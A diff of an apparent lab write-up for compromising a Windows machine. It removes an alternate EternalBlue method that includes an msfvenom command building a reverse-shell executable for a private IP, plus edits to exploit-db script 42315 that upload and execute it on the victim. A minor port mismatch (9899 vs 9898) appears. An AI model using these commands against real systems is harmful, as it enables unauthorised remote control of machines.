@@ -15,22 +15,3 @@ iii. Add '\0x90' such that total size of payload becomes equal to 360 bytes(same
 [Size of my payload generated = 348 bytes so addded "\x90" *12 to my shellcode]
 
 & get reverse shell on nc :).
-
-
-=>Alternate Way (Eternal Blue):
-Since machine was also vulnerable to eternalblue,got reverse shell exploiting "eternalblue".
-Reference:https://www.exploit-db.com/exploits/42315 (only modify 2 lines send_file to send our revershell.exe generated via msfvenom).
-
-Exploit:
-payload generated via command:
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=9899 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse_shell.exe
-
-Changes in 42315.py: 
-	smb_send_file(smbConn, 'reverse_shell.exe','C','/windows/temp/reverse_shell.exe')
-        service_exec(conn, r'cmd /c c:\\windows\temp\reverse_shell.exe')
-Above command will copy reverse_shell to victim pc's temp folder and then execute it.
-
-python 42315.py 192.168.1.6
-
-Got reverse shell on port 9898 :).
-
